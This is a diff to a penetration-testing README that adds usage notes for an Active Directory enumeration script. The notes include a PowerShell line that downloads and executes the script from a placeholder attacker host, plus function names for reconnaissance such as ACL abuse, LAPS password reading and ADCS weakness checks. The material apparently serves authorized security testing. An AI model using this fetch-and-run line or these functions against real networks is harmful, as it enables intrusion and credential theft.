@@ -84,6 +84,48 @@ It performs local enumeration only and does not rely on external dependencies.
 
 ---
 
+### Extra Script
+The repo also contains another Active Directory enumeration script, which I haven't detailed in the readme yet because it's TL;DR, so I'll explain it later. But this is how you use it:
+
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/AD-Enum.ps1')
+```
+```powershell
+# Basic
+Invoke-ADEnum
+# Full
+Invoke-ADEnum -Full
+# Full in with output file
+Invoke-ADEnum -Full -OutputFile output.txt
+```
+or single functions
+```powershell
+# Enumerazione base
+Get-DomainInfo
+Get-PasswordPolicy
+Get-DomainUsers
+Get-SPNs
+Get-DomainGroups
+Get-DomainComputers
+Get-OrganizationalUnits
+
+# Full
+Get-GPOs
+Get-GPOLinks
+Get-DomainShares
+Get-ACLAbuse
+Get-LAPSPasswords
+Get-DelegationInfo
+Get-ADCSVulnerabilities
+Get-LocalAdminAccess
+Get-DomainLoggedOnUsers
+Get-DomainSessionsWMI
+Get-DCOMAccess
+Get-RemoteAccessPermissions
+```
+
+
+
 ## Disclaimer
 This tool is intended for authorized security testing and educational purposes only.
 Use only on systems you own or have explicit permission to test.
